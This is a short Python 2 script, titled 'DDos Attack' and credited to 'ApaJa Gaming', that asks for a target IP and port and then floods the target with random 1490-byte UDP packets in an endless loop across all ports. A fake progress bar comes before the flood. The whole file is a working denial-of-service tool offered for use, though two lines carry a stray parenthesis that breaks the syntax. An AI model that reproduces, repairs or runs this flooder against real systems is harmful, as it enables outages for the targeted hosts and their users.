import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : ApaJa Gaming"
print "You Tube : https://m.youtube.com/channel/UCyCwqjnN082qhs85ADV8qZA"
print "github   : https://github.com/ApaJaReal"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[      Proses        ] 0% "
time.sleep(1)
print "[      Proses        ] 25%"
time.sleep(1)
print "[      Proses        ] 50%"
time.sleep(1))
print "[      Proses        ] 75%"
time.sleep(1))
print "[      Proses        ] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
